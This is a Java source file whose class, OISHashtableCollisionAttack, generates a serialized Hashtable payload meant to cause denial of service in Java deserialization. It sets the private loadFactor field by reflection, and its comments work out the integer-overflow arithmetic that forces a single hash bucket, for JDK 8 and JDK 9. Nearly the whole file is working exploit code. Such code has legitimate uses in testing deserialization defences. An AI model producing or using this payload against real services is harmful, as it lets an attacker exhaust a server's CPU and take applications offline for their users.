package cz.topolik.oisdos;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;

/**
 * @author Tomas Polesovsky
 */
public class OISHashtableCollisionAttack {

	public static byte[] generatePayload(int entries) throws Exception {
		Hashtable hashtable = new Hashtable();

		for (int i = 0; i < entries; i++) {
			String item = new String(Character.toChars(i));
			hashtable.put(item, item);
		}

		/*
			JDK 1.8 and older
			=================
			http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/652c6ab45018/src/share/classes/java/util/Hashtable.java#l1179
			Hashtable.readObject():
			...
			int length = (int)(elements * loadFactor) + (elements / 20) + 3;
			...
			table = new Entry<?,?>[length];

			----------------------------

			To have just one bucket in the hash table => lenght==1.
			Now we can use int overflow to get the right loadFactor:

			1 == (elements * loadFactor) + (elements / 20) + 3
			<==>
			(Integer.MAX_VALUE * 2 + 3) == (elements * loadFactor) + (elements / 20) + 3
			<==>
			Integer.MAX_VALUE * 2 + 3 - 3 == (elements * loadFactor) + (elements / 20)
			<==>
			Integer.MAX_VALUE * 2 - (elements / 20) == elements * loadFactor
			<==>
			(Integer.MAX_VALUE * 2 - (elements / 20)) / elements == loadFactor
		 */

		double loadFactorValue = (double) (Integer.MAX_VALUE*2 - (entries / 20)) / entries;

		/*
			JDK 9
			=====
			http://hg.openjdk.java.net/jdk9/dev/jdk/file/2ba1aed4abb2/src/java.base/share/classes/java/util/Hashtable.java#l1250

			int length = (int)((elements + elements / 20) / loadFactor) + 3;

			For length to be 1:

			double loadFactorValue = (double) (elements + elements / 20) / (Integer.MAX_VALUE*2);
		 */

		loadFactor.set(hashtable, (float)loadFactorValue);

		ByteArrayOutputStream baos = new ByteArrayOutputStream();

		new ObjectOutputStream(baos).writeObject(hashtable);

		return baos.toByteArray();
	}

	static Field loadFactor;

	static {
		try {
			loadFactor = Hashtable.class.getDeclaredField("loadFactor");
			loadFactor.setAccessible(true);
		}
		catch (NoSuchFieldException e) {
			throw new RuntimeException("Unable to obtain field Hashtable.loadFactor", e);
		}
	}
}
